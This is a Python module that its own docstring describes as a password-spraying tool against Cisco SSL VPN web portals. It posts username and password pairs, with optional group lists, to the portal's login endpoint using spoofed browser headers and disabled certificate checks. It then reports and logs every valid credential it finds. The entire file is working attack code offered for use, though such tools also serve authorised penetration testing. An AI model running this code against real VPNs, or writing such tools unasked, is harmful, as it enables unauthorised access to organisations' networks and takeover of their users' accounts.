#!/usr/bin/env python3

import requests, warnings
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''This function enables password spraying against Cisco SSLVPN.
It has functionality for both group list and non group list portal.'''
def cisco_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    ciscourl = ''.join(params.get("host"))
    ciscoendpt = ciscourl + '/+CSCOE+/logon.html'
    posturl = ciscourl + '/+webvpn+/index.html'
    hosturl = ciscourl.split('//')[1].split('/')[0]
    group = params.get('group')

    headers = {
        'Host': hosturl,
        'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': ciscourl,
        'DNT': '1',
        'Connection': 'close',
        'Referer': ciscoendpt,
        'Cookie': 'webvpnlogin=1; webvpnLang=en',
        'Upgrade-Insecure-Requests':'1'
    }
    if group != 'None':
        data = 'tgroup=&next=&tgcookieset=&group_list={}&username={}&password={}&Login=Login'.format(group,username,password)
    else:
        data = 'tgroup=&next=&tgcookieset=&username={}&password={}&Login=Login'.format(username,password)
    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [Cisco] Target: {ciscourl} User: {username} [{place} of {count}, {place} completed] Password: {password}")

        query = requests.post(
            posturl, json=data, headers=headers, verify=False)
        #print (type(query.headers['Set-Cookie'])
        if query.status_code == 200:
            if 'webvpn=;' not in query.headers['Set-Cookie']:
                print(f"ACCOUNT FOUND: [Cisco] Target: {ciscourl} User: {username} Password: {password} [SUCCESS]")
                if filelogger != None:
                    filelogger.debug("ACCOUNT FOUND: [Cisco] Target: {} User: {} Password: {} [SUCCESS]".format(ciscourl, username, password))
        elif query.status_code != 401:
            print(f"The Header Respose code to investigate: {query.status_code}")

    except:
        pass
